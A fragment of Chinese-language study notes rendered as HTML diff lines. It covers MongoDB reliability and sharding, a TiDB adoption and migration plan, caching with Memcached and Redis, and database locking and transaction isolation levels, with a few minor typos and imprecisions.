+}</p>
+<hr>
+<p>MongoDB特性</p>
+<p>可扩展性（scalable）</p>
+<p>高性能（high-performance）</p>
+<p>开源（open source）NoSQL database</p>
+<p>Written in C++</p>
+<p>Document-Oriented Storage</p>
+<p>Full Index Support</p>
+<p>Replication &amp; High Availability</p>
+<p>Auto-Sharding</p>
+<p>Rich Querying</p>
+<p>Updates</p>
+<p>Map/Reduce</p>
+<p>GridFS：二进制存储</p>
+<h3><a class="anchor" aria-hidden="true" id="mongodb数据稳定性-可靠性"></a><a href="#mongodb数据稳定性-可靠性" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>MongoDB数据稳定性-可靠性</h3>
+<p>1、MongoDB丢数据问题</p>
+<p>2.6之前的版本为了提高MongoDB的写性能，默认是写主库成功后就返回了，所以当主库宕机后，存在一定的概率丢失数据。</p>
+<p>如何解决：</p>
+<p>恢复日志（journal）：大多数关系型数据库为了解决因系统掉电或者崩溃时导致内存数据丢失问题（保证本机突然宕机不丢失），该参数在2.0之前，默认不开启，2.0之后默认开启。配置【{j:1}】</p>
+<p>写关注（write concern）写几个才返回用户写成功</p>
+<p>{w: 0} Unacknowledged 并不会返回一个是否写成功的状态值</p>
+<p>{w: 1} Acknowledged 基于主节点的内存写入（默认）</p>
+<p>{w: 2} majority 写入大多数节点（推荐）</p>
+<p><img src="media/image60.png" alt="">{width=&quot;3.0766404199475064in&quot;
+height=&quot;2.822791994750656in&quot;}</p>
+<h3><a class="anchor" aria-hidden="true" id="mongodb高可用"></a><a href="#mongodb高可用" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>MongoDB高可用</h3>
+<p>MongoDB副本集（replica
+set）：数据多份冗余，跨交换机部署，通过类似Raft协议实现更快的选主。</p>
+<p>1、单个副本集replica set</p>
+<p><img src="media/image61.png" alt="">{width=&quot;2.1337937445319337in&quot;
+height=&quot;1.7192672790901138in&quot;}</p>
+<p>同步采用Oplog，也可以通过配置实现读写分离。</p>
+<p>2、MongoDB分片（Sharding），Sharding Cluster，数据库分片</p>
+<p><img src="media/image62.png" alt="">{width=&quot;3.097916666666667in&quot;
+height=&quot;2.398086176727909in&quot;}</p>
+<p>每一个Shard都是一个replica set。</p>
+<p>3、Sharding Collection（类似表分片）</p>
+<p><img src="media/image63.png" alt="">{width=&quot;2.7751541994750655in&quot;
+height=&quot;2.5901443569553804in&quot;}</p>
+<p>这里面的Shard就是下面的Chunk。支持两种分片方式，Range-based和Hash-based：</p>
+<p><img src="media/image64.png" alt="">{width=&quot;3.262782152230971in&quot;
+height=&quot;1.0298458005249345in&quot;}<img src="media/image65.png" alt="">{width=&quot;2.847916666666667in&quot;
+height=&quot;1.0145702099737532in&quot;}</p>
+<p><img src="media/image66.png" alt="">{width=&quot;4.847916666666666in&quot;
+height=&quot;2.7989074803149605in&quot;}</p>
+<h3><a class="anchor" aria-hidden="true" id="mongodb应用场景（对事务一致性要求不高的）"></a><a href="#mongodb应用场景（对事务一致性要求不高的）" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>MongoDB应用场景（对事务一致性要求不高的）</h3>
+<p>1、基于位置的移动搜索应用（基于自身的地理空间索引）</p>
+<p>2、日志分析平台，MongoDB本身自带的高性能聚合框架</p>
+<p>3、可以存储简历、或者投递关系等相对复杂的数据结构，比如简历库</p>
+<p>4、可以存储用户数据或者帖子信息</p>
+<h3><a class="anchor" aria-hidden="true" id="mongodb可扩展存储"></a><a href="#mongodb可扩展存储" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>MongoDB可扩展存储</h3>
+<h2><a class="anchor" aria-hidden="true" id="newsql数据库应用实践"></a><a href="#newsql数据库应用实践" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>NewSQL数据库应用实践</h2>
+<h3><a class="anchor" aria-hidden="true" id="面临的问题"></a><a href="#面临的问题" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>面临的问题</h3>
+<p>目前主要使用是MySQL+MongDB，存在问题：</p>
+<p>大数据量性能瓶颈（上亿数据）、业务层Sharding、业务成本（业务逻辑复杂性增加，分库分表后可能还要创建映射表，映射表也要分表），运维成本（故障切换时长&amp;高可用方案，高可用方案需要二次开发）</p>
+<p>总结：</p>
+<p>①数据量大，如何快速水平扩展存储（老的分库分表方式，扩存储要考虑数据迁移方案）</p>
+<p>②大数量下，如何快速DDL</p>
+<p>③业务层分库分表造成业务逻辑非常复杂</p>
+<p>④常规MySQL主从故障转移造成业务不可用</p>
+<p>⑤开源高可用运维方案不友好，需要自开发</p>
+<h3><a class="anchor" aria-hidden="true" id="选择newsql"></a><a href="#选择newsql" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>选择NewSQL</h3>
+<p>为什么选择NewSQL？</p>
+<p>1、RDBMS --&gt; NoSQL -&gt; NewSQL</p>
+<p>2、sharding语义下推到数据库，对外就是一张表</p>
+<p>3、业务开发简单</p>
+<p>4、运维成本降低</p>
+<p>已有的NewSQL:</p>
+<p>Google Spanner/F1：不开源</p>
+<p>CockroachDB：</p>
+<p>TiDB：PingCAP公司开源，目前使用范围较广</p>
+<p>开源分布式NewSQL关系型数据库</p>
+<p>自动水平伸缩</p>
+<p>强一致性分布式事务</p>
+<p>基于Raft算法的多副本复制</p>
+<p>高度兼容MySQL协议（存储过程，触发器等不支持）</p>
+<p>TiDB整体架构</p>
+<p>SQL层与存储层分离</p>
+<p>TiDB Server：MySQL协议</p>
+<p>TiKV Server：使用Facebook开源的RocksDB</p>
+<p>PD Server：基于etcd</p>
+<p><img src="media/image67.png" alt="">{width=&quot;4.9060684601924756in&quot;
+height=&quot;2.4746095800524937in&quot;}</p>
+<h3><a class="anchor" aria-hidden="true" id="tidb测试"></a><a href="#tidb测试" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>TiDB测试</h3>
+<p>1、功能测试</p>
+<p>支持绝大多数MySQL语法，存储过程、自定义函数，触发器除外</p>
+<p>基于MySQL业务无缝歉意</p>
+<p>2、性能测试</p>
+<p>硬件环境：3台CPU密集型物理服务器，启动TiDB Server及PD
+Server；3台IO密集型PCIe（SSD，PCIe</p>
+<p>接口）物理服务器，启动TiKV Server</p>
+<p>软件环境：TiDB-V1.1.0</p>
+<p>压测工具：Sysbench-1.0.11（官方提供）</p>
+<p>监控：TiDB配套监控（prometheus，grafana）、Zabbix</p>
+<p>3、测试方案</p>
+<p>4、测试结果</p>
+<p>不同场景的QPS，不通场景的响应时长</p>
+<p>不通场景：读写5:1、只读、只写、随机对</p>
+<p>5、压力测试总结</p>
+<p>顺序扫描效率高，连续行大概率存储在同一台机器相邻近位置，批量读写效率高</p>
+<p>控制并发运行的线程数，会减少请求响应时间，提高处理性能</p>
+<p>6、场景建议</p>
+<p>适合线上业务混合读写场景</p>
+<p>适合顺序写场景：数据归档、操作日志、摊销流水灯</p>
+<h3><a class="anchor" aria-hidden="true" id="tidb预上线"></a><a href="#tidb预上线" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>TiDB预上线</h3>
+<p>制定预上线方案：</p>
+<p>TiDB挂载到线上MySQL、作为MySQL从库同步线上数据</p>
+<p>首先将业务部分读流量切换到TiDB，做好预判，逐步灰度流量到100%</p>
+<p>然后切换业务部分写流量到TiDB，做好预判，逐步灰度流量到100%</p>
+<p>选取接入的业务</p>
+<p>根据实际情况选取，可优先选择性能瓶颈的业务，需要再次拆分的表</p>
+<p>测试验证</p>
+<p>引入线上数据和流量到线下（可通过MQ，线上双写MQ和DB，线下消费MQ写入到TiDB）、大量功能和性能验证（日志、耗时、DBA数据抽样正确性验证）</p>
+<p><img src="media/image68.png" alt="">{width=&quot;2.937318460192476in&quot;
+height=&quot;2.459646762904637in&quot;}</p>
+<p>线上：</p>
+<p>1、同步数据：TiDB集群作为MySQL实例从库，MySQL单实例分表同步到TiDB一张大表：syncer官方同步工具</p>
+<p><img src="media/image69.png" alt="">{width=&quot;3.0102351268591425in&quot;
+height=&quot;1.8096544181977252in&quot;}</p>
+<p>2、切流量：先将读流程灰度切到TiDB，观察一周，逐步灰度至100%，再业务双写，验证没问题后，停止也mysql。</p>
+<h3><a class="anchor" aria-hidden="true" id="上线后效果分析"></a><a href="#上线后效果分析" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>上线后效果分析</h3>
+<p>数据库请求延时情况</p>
+<p>业务请求队列等待情况</p>
+<p>请求队列的等待情况：业务延时和错误量情况</p>
+<h2><a class="anchor" aria-hidden="true" id="数据库数据无缝迁移"></a><a href="#数据库数据无缝迁移" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>数据库数据无缝迁移</h2>
+<p>区分数据类型，不同数据类型区分对待。</p>
+<p>时效性数据：比如时效性1个月，从某个时间开点开始同步双写，读还是读老库，一个月之后就可以直接读新库，老库也不用再写了。</p>
+<p>永久性数据：</p>
+<p>1、上线新功能，让数据库写老库的同时同步写MQ</p>
+<p>2、在某个时间点，比如20日20点，把老库的从库从集群里面摘下，然后把数据导入到新库</p>
+<p>3、导入完成后，开始消费20日20点之后的消息，然后写新库</p>
+<p>4、新老库数据一致性的稽核</p>
+<p>5、上线，停掉写老库和写MQ，直接写新库，读新库</p>
+<p><img src="media/image70.png" alt="">{width=&quot;3.7343427384076993in&quot;
+height=&quot;4.081160323709536in&quot;}</p>
+<p><strong>RocketMQ如何指定从某个时间点开始消费？</strong></p>
+<p>consumer.setConsumeFromWhere(ConsumeFromWhere.<strong><em>CONSUME_FROM_TIMESTAMP</em></strong>);<br>
+consumer.setConsumeTimestamp(<strong>&quot;20200420200000&quot;</strong>);</p>
+<h2><a class="anchor" aria-hidden="true" id="缓存数据一致性实践"></a><a href="#缓存数据一致性实践" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>缓存数据一致性实践</h2>
+<p>1、缓存作用</p>
+<p>降低请求的响应时间，提升用户体验，减少对固化存储的读压力。缓存为什么可以降低响应时间：①缓存所采用的存储性能要高于数据本身存储的性能，比如数据放内存，缓存时CPUcache；数据放磁盘，缓存可以是内存。②缓存数据可以更靠近数据需要使用的地方，比如本地缓存、CDN缓存。</p>
+<p>2、适合场景</p>
+<p>静态资源的缓存，较少更改资源的缓存，读多写少场景（互联网，读10写1，甚至读10万写1，比如热门文章，需要热点数据的自动发现机制：越靠近用户的缓存代价越大，不可能把所有的数据都放置在缓存，需要自动发现，把热点的数据，自动拉入到缓存中）</p>
+<p>3、不适合的场景：频繁更新，读少写多（比如日志）</p>
+<p>4、缓存类型：本地缓存，分布式缓存</p>
+<p>5、本地缓存作用</p>
+<p>静态不变数据，减少网络I/O交互，如电商分类类名数据。注意使用本地缓存需要数据基本不变，而且能容忍短时间的数据不一致。本地缓存是进程级别的，很难通过其他进程去更新。如果一定要更新可以采用消息机制去更新。</p>
+<p>开源产品：Google Guava Cache</p>
+<p>6、分布式缓存</p>
+<p>缓存相对静态数据：如IM个人信息，电商商品信息，电商购买商品列表；缓存数据量较大，单机无法存放的数据。</p>
+<p>开源产品：Memcached，Redis（Master-Slave，Redis
+Cluster），Codis（分布式Redis解决方案，豌豆荚开源），Twemproxy（Redis的一种代理分片机制，Twitter开源）</p>
+<p>7、Memcached</p>
+<p>分布式缓存服务；仅仅支持Key-Value；Key是字符串，Value可以是字符串、也可以是Binary，大小不能超过1MB；Server不是分布式，分布式支持靠客户端实现；性能较高（W+吞吐量）；不可持久化仅仅缓存；使用简单，使用较多。</p>
+<p>8、Redis</p>
+<p>Key-Value结构，Key是字符串，Value可以是字符串、Set、ZSet、Map、List，支持类型丰富</p>
+<p>Server不是分布式，分布式靠客户端实现</p>
+<p>性能较高（5W+吞吐量）</p>
+<p>Master-Slave方式具有高可靠性，高可用性</p>
+<p>具备持久功能：RDB快照和AOF配置刷盘</p>
+<h2><a class="anchor" aria-hidden="true" id="缓存热点数据自动发现机制"></a><a href="#缓存热点数据自动发现机制" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>缓存热点数据自动发现机制</h2>
+<h2><a class="anchor" aria-hidden="true" id="数据库基础知识"></a><a href="#数据库基础知识" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>数据库基础知识</h2>
+<h3><a class="anchor" aria-hidden="true" id="丢失的数据"></a><a href="#丢失的数据" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>丢失的数据</h3>
+<p>A、B两个线程同时去修改数据，造成数据丢失。</p>
+<p>解决方法，写时加排他锁X：在事务修改数据之前加上X锁，直到事务结束后才释放</p>
+<p><img src="media/image80.png" alt="">{width=&quot;3.18125in&quot; height=&quot;2.212275809273841in&quot;}</p>
+<h3><a class="anchor" aria-hidden="true" id="脏数据-读取未提交的数据（read-uncommitted）"></a><a href="#脏数据-读取未提交的数据（read-uncommitted）" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>脏数据-读取未提交的数据（Read Uncommitted）</h3>
+<p>上面的写时加排他锁（X锁），但读时不加锁，会出现读取脏数据的情况。</p>
+<p>读时加S锁：为了防止长时间锁，在读数据时加上S锁，读完后立即释放S锁。如果一个数据加了X锁，就不能加S锁，同样一个数据加了S锁，就不能加X锁。</p>
+<p><img src="media/image81.png" alt="">{width=&quot;3.0120505249343834in&quot;
+height=&quot;2.1657403762029745in&quot;}</p>
+<p>通过X、S锁就实现了读取已提交数据（Read Committed）。</p>
+<h3><a class="anchor" aria-hidden="true" id="不可重复读"></a><a href="#不可重复读" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>不可重复读</h3>
+<p>因为共享锁是在读完之后立即释放，而不是整个事务期间的，出现了在同一个事务期间两次读到的数据不一致。</p>
+<p>解决方法，读锁是整个事务周期，就是可以重复读了，Repeatable Read。</p>
+<p><img src="media/image82.png" alt="">{width=&quot;3.394212598425197in&quot;
+height=&quot;3.1151465441819775in&quot;}</p>
+<p>幻读指的是在同一事务下，连续执行两次同样的SQL语句第二次的SQL语句可能返回之前不存在的行；</p>
+<p>可重复读指的是同一行在同一个事务下无论怎么读取都是同一个结果(除非自己把它改了)。</p>
+<h3><a class="anchor" aria-hidden="true" id="幻读"></a><a href="#幻读" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>幻读</h3>
+<p><img src="media/image83.png" alt="">{width=&quot;1.5979166666666667in&quot;
+height=&quot;2.28747375328084in&quot;}</p>
+<p>通过Serializable解决。</p>
+<p>上面的加锁模式感觉还是有问题的，没有说清，也不知道是否对错。</p>
+<h3><a class="anchor" aria-hidden="true" id="事务的隔离级别"></a><a href="#事务的隔离级别" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>事务的隔离级别</h3>
+<p>由ISO/ANSI SQL92定义的4个事务隔离级别。</p>
+<p>1、读未提交，Read
+Uncommitted，一个事务可以读取到另外一个事务未提交的数据，出现数据&quot;脏读&quot;</p>
+<p>2、读已提交，Read
+Committed，一个事务要等到另外一个事务提交才能读到更新的数据，大多数数据库默认的隔离级别，存在问题&quot;不可重复读&quot;，即同一个事务中，可能每次读的数据不一致</p>
+<p>3、可重复读，Repeatable
+Read，事务中每次读到的数据是一致的，MySql默认的隔离级别，存储问题&quot;幻读&quot;，一个事务两次读之间，另一个事务又插入了新的数据</p>
+<p>写冲突，即一个事务第一次查询发现没有数据，然后插入，又发现冲突（其它事务在这段时间插入了数据）</p>
+<p>4、序列化，Serizlizable，不允许其他事务与正在执行事务并发执行</p>
+<h3><a class="anchor" aria-hidden="true" id="多版本并发控制"></a><a href="#多版本并发控制" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>多版本并发控制</h3>
+<p>MySQL的大多数事务型存储引擎实现的都不是简单的行级锁。基于提升并发性能的考虑，它们一般都同时实现了多版本并发控制（MVCC）。不仅是MySQL，包括Oracle，PostgreSQL等其它数据库也都实现了MVCC，但各自的实现机制不尽相同，因为MVCC没有一个统一的实现标准。</p>
+<p>MVCC是行级锁的一个变种，但是它在很多情况下避免了加锁操作，因此开销更低。</p>
